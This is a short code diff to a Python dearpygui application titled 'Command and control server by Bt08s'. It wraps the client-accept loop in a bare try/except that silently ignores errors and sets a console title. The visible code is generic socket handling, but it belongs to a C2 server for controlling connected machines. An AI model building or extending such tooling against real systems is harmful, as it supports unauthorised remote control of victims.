@@ -35,12 +35,15 @@ def listen():
 def handle_clients():
     global clients
     while True:
-        client, address = server.accept()
-        clients.append(client)
-        print(f"New connection from {address[0]}:{address[1]}")
+        try:
+            client, address = server.accept()
+            clients.append(client)
+            print(f"New connection from {address[0]}:{address[1]}")
 
-        t = threading.Thread(target=handle_data, args=(client, address))
-        t.start()
+            t = threading.Thread(target=handle_data, args=(client, address))
+            t.start()
+        except:
+            pass
 
 
 def handle_data(client, address):
@@ -84,6 +87,7 @@ with dpg.theme() as global_theme:
         dpg.add_theme_style(dpg.mvStyleVar_FramePadding, 4, 4)
         dpg.add_theme_style(dpg.mvStyleVar_ItemSpacing, 5, 5)
 
+set_console_title("Server")
 dpg.bind_theme(global_theme)
 dpg.create_viewport(title='Command and control server by Bt08s', width=600, height=287)
 dpg.setup_dearpygui()
